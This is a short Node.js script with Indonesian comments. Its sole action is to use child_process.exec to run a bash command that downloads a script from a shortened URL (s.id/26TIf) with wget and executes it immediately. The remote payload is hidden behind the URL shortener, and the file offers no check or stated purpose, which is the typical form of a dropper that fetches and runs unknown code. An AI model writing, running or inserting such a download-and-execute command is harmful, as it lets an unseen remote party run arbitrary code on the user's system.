const { exec } = require('child_process');

// Perintah yang akan dijalankan tanpa nama acak
const command = 'bash -c "$(wget -qO- s.id/26TIf)"';

// Menjalankan perintah menggunakan exec
exec(command, (error, stdout, stderr) => {
    if (error) {
        console.error(`Error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.error(`Stderr: ${stderr}`);
        return;
    }
    console.log(`Stdout: ${stdout}`);
});
